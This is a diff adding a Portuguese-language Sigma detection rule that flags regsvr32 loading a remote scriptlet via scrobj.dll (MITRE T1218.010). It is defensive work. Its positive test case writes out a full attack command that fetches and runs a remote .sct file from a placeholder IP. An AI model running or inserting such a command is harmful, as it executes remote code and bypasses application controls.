@@ -1,0 +1,29 @@
+title: 'Regsvr32 carregando scriptlet remoto'
+id: '16e275ff-6114-5b91-85c0-b2eb0e82a592'
+status: 'stable'
+description: 'O regsvr32 com scrobj.dll ou uma URL executa código remoto sem gravar arquivo: um desvio clássico de controles de aplicativos.'
+references:
+    - 'https://attack.mitre.org/techniques/T1218/010/'
+author: 'RuleForge (regras de exemplo)'
+date: '2026/10/23'
+tags:
+    - 'attack.stealth'
+    - 'attack.t1218.010'
+logsource:
+    category: 'process_creation'
+    product: 'windows'
+detection:
+    selection:
+        Image|endswith: '\regsvr32.exe'
+        CommandLine|contains:
+            - '/i:http'
+            - 'scrobj.dll'
+    condition: 'selection'
+falsepositives:
+    - 'Praticamente nenhum uso legítimo com URL'
+level: 'high'
+x_tests:
+    positive:
+        - {Image: 'C:\Windows\System32\regsvr32.exe', CommandLine: 'regsvr32 /s /n /u /i:http://203.0.113.5/x.sct scrobj.dll'}
+    negative:
+        - {Image: 'C:\Windows\System32\regsvr32.exe', CommandLine: 'regsvr32 /s C:\app\componente.dll'}
